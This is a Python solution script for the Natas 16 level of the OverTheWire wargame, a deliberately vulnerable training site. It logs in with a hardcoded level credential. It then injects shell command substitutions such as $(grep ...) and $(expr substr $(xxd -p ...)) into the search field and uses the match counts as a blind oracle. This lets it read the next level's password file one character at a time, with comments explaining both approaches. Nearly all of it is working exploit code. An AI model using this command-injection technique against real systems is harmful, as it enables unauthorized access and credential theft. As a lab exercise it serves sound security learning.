import requests
from string import ascii_letters, digits


def get_matches(needle):
    """
    Return list of words matching needle
    """
    matches = []

    r = requests.post(
        "http://natas16.natas.labs.overthewire.org/",
        auth=("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"),
        data={
            "needle": needle,
        },
    )

    lines = r.content.decode().splitlines()

    for word in lines[22:]:
        if word == "</pre>":
            break
        matches.append(word)

    return matches


# First version, doesn't work because 'passthru' does not have access to xxd =(
#
# Basic idea is to inject a command that gets the ith character of the file, and deduce it from the matches
# in the dictionary (e.g. here the number of matches is unique to each letter):
#
# needle = f"$(expr substr $(head -n 1 /etc/natas_webpass/natas17) {i} 1)"
#
# However:
# 1) we can't deduce chars that have no match in dictionary.txt (e.g. numbers here)
# 2) we can't know if a letter is upper or lowercase due to grep -i option
# 3) some chars may interact strangely with grep (not an issue here since only alphanums, but in general)
#
# To solve those issues, we'll get the hexadecimal representation of characters instead, and map chars that
# have no match to ones that do (here 0-9 to g-p)
#
# e.g. if ith char is 'o' (hex 6f), 6 is mapped to 'm', so we'll grep 'm' and 'f'
#
# Took a bit of thinking to do the equivalent of "tr 0-9 g-p < <(...)" without process substitution,
# which is not managed by 'passthru' either


mapper = {}
for c in "abcdefghijklmnop":
    matches = get_matches(c)
    mapper[len(matches)] = c

password = ""
file_length = 32
for i in range(file_length):
    hex = ""
    for hex_pos in range(2):
        pwn_needle = f"$(expr substr $(xxd -p /etc/natas_webpass/natas17) {i * 2 + hex_pos + 1} 1)"

        matches = get_matches(pwn_needle)

        if matches:
            # => letter (a-f)
            hex += mapper[len(matches)]
        else:
            # => number
            pwn_needle = f"$(expr substr $(echo ghijklmnop) $(( $(expr substr $(xxd -p /etc/natas_webpass/natas17) {i * 2 + hex_pos + 1} 1) + 1 )) 1)"

            matches = get_matches(pwn_needle)

            hex += mapper[len(matches)].translate(str.maketrans("ghijklmnop", "0123456789"))

    password += bytes.fromhex(hex).decode()
    print(password)


# Second version
#
# Inject a word of the dictionary that only has one match (i.e. that is not the prefix of another word in the dictionary)
# followed by a grep of the password prefix (same idea as Natas 15):
# - if prefix is wrong, inner grep will return nothing => outer grep will return word
# - if prefix is right, inner grep will return something => outer grep will return nothing

alphabet = ascii_letters + digits

password = ""
password_length = 32
for pos in range(1, password_length + 1):
    for c in alphabet:
        pwn_needle = f"hackers$(grep ^{password}{c} /etc/natas_webpass/natas17)"

        matches = get_matches(pwn_needle)

        if not matches:
            password += c
            print(password)
            break
